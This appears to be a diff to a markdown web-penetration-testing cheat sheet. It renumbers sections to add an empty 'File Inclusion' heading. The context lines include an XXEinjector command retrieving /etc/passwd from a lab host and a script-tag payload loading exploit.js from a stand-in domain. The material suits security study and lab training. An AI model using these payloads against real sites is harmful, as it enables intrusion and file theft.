@@ -23,10 +23,11 @@ Overview
 19. - [HTTP Verb Tampering](#19---http-verb-tampering)
 20. - [Insecure Direct Object References (IDOR)](#20---insecure-direct-object-references-idor)
 21. - [XML External Entity (XXE) Injection](#21---xml-external-entity-xxe-injection)
-22. - [Sensitive Data Exposure](#22---sensitive-data-exposure)
-23. - [HTML Injection](#23---html-injection)
-24. - [Cross-Site Request Forgery (CSRF)](#24---cross-site-request-forgery-csrf)
-25. - [Exploit Research](#25---exploit-research)
+22. - [File Inclusion](#22---file-inclusion)
+23. - [Sensitive Data Exposure](#23---sensitive-data-exposure)
+24. - [HTML Injection](#24---html-injection)
+25. - [Cross-Site Request Forgery (CSRF)](#25---cross-site-request-forgery-csrf)
+26. - [Exploit Research](#26---exploit-research)
    
 #1. - Web Requests
 -----------------------------------------
@@ -1528,7 +1529,10 @@ $ ruby XXEinjector.rb --host=<IP address> --httpport=8000 --file=/tmp/xxe.req --
 $ cat Logs/10.129.201.94/etc/passwd.log
 ```
 
-#22. - Sensitive Data Exposure
+#22. - File Inclusion
+-----------------------------------------
+
+#23. - Sensitive Data Exposure
 -----------------------------------------
 
 - Source Code
@@ -1539,7 +1543,7 @@ OR
 CTRL + U
 ```
 
-#23. - HTML Injection
+#24. - HTML Injection
 -----------------------------------------
 
 - Hyperlink
@@ -1549,7 +1553,7 @@ CTRL + U
 ```
 
 
-#24. - Cross-Site Request Forgery (CSRF)
+#25. - Cross-Site Request Forgery (CSRF)
 -----------------------------------------
 
 - Password Change
@@ -1558,7 +1562,7 @@ CTRL + U
 "><script src=//www.example.com/exploit.js></script>
 ```
 
-#25. - Exploit Research
+#26. - Exploit Research
 -----------------------------------------
 
 - CVEdetails
